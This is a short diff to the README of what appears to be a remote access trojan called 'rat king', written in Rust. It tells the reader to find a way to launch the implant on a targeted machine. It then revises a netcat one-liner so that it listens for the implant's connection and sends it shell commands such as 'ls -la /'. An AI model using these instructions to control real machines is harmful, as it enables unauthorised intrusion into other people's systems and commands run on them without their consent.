@@ -26,7 +26,7 @@ and get the build inside the usual Rust build folder ./target/release/ .
 
 Find a way to launch this on the targeted machine and use rat king to send commands.
 
-You can also use netcat to send commands one by one : 
+You can also use netcat to listen for connections and respond with commands one by one : 
 ```sh
-echo "ls -la /" | nc $CLIENT_IP $CLIENT_PORT
+echo "ls -la /" | nc -l $SERVER_IP $SERVER_PORT
 ```
